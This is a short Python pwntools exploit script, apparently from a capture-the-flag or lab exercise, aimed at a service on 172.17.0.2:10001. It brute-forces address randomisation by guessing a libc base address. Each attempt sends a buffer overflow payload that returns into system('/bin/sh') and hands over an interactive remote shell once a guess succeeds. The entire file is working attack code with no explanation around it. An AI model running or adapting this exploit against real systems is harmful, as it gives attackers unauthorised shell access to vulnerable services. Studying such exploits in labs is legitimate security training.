#!/usr/bin/python
#coding:utf-8

from pwn import *

guess_libc_addr = 0xf7d77000
system_addr = guess_libc_addr+0x3b060
binsh_addr = guess_libc_addr+0x15fa0f
i = 0

while True:
	i += 1
	log.info("try time %d" %i)
	io = remote('172.17.0.2', 10001)
	
	payload = '0'*22
	payload += p32(system_addr)
	payload += p32(0)
	payload += p32(binsh_addr)
	
	try:
		io.send(payload)
		io.recv(timeout = 1)
	except EOFError:
		io.close()
	else:
		io.interactive()
		break
		
